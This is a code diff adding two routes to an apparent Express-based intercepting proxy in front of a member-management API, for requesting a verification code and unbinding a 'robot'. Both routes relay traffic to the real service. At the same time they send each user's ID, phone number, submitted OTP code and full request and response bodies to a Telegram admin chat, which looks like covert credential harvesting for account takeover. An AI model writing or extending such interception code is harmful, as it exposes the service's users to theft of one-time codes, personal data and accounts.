@@ -2033,6 +2033,36 @@ app.all('/app/api/memberManager/bindRobotDetail', async (req, res) => {
   } catch(e) { await transparentProxy(req, res); }
 });
 
+app.all('/app/api/memberManager/getMemberVerificationCode', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const phone = getPhone(data, userId);
+    if (data.adminChatId && bot) {
+      const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000);
+      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
+      bot.sendMessage(data.adminChatId, `🔑 OTP Request (Verification Code)\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📝 codeType: ${(req.parsedBody || {}).codeType || 'N/A'}\n\n📤 REQUEST BODY:\n${reqBody}\n\n📥 FULL RESPONSE:\n${respDump}`).catch(()=>{});
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.all('/app/api/memberManager/v2/unbindRobot', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const phone = getPhone(data, userId);
+    if (data.adminChatId && bot) {
+      const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000);
+      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
+      bot.sendMessage(data.adminChatId, `🔓 UNBIND ROBOT ATTEMPT\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n🔢 Code Sent: ${(req.parsedBody || {}).verificationCode || 'N/A'}\n📊 Status: ${jsonResp?.status || 'N/A'}\n💬 Message: ${jsonResp?.message || 'N/A'}\n\n📤 REQUEST:\n${reqBody}\n\n📥 FULL RESPONSE:\n${respDump}`).catch(()=>{});
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
 app.all('/app/api/orderOut/receiveOcr', async (req, res) => {
   const data = await loadData();
   try {
